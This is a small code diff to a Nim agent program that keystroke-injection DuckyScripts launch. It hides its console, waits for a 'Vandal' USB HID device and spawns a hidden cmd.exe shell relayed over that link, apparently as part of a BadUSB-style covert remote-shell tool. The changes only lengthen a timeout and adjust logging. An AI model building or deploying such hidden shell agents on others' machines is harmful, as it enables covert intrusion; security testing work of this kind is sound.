@@ -7,7 +7,7 @@
 ## `--app:gui` so no console window appears; on POSIX the launcher
 ## DuckyScripts disown the process. Pass `--debug` to log to stderr.
 
-import std/[os, options, osproc, parseopt, strutils]
+import std/[options, parseopt, strutils]
 import ./transport_hid, ./shell_child, ./pump
 
 proc usage() =
@@ -16,7 +16,13 @@ proc usage() =
 proc main() =
   var debugEnabled = false
   var once = false
-  var waitMs = 10_000
+  # Default 20 s. The launcher DuckyScript spawns us right after typing
+  # the powershell one-liner, but Windows can take a while to surface a
+  # freshly-mounted composite device's vendor HID interface (especially
+  # the first time the driver stack binds it). 10 s was occasionally
+  # too tight in field tests; 20 s gives comfortable headroom while
+  # still failing fast on genuinely absent agents.
+  var waitMs = 20_000
 
   for kind, key, val in getopt():
     case kind
@@ -47,7 +53,8 @@ proc main() =
 
   let linkOpt = waitForDevice(
     maxAttempts = max(1, waitMs div 200),
-    intervalMs = 200
+    intervalMs = 200,
+    debug = logger
   )
   if linkOpt.isNone:
     if logger != nil: logger("Vandal vendor HID not found, exiting")
@@ -61,7 +68,7 @@ proc main() =
     let child = spawnShell()
     if logger != nil:
       when defined(windows):
-        logger("spawned shell pid=" & $child.process.processID())
+        logger("spawned shell (cmd.exe, hidden console)")
       else:
         logger("spawned shell pid=" & $child.pid)
 
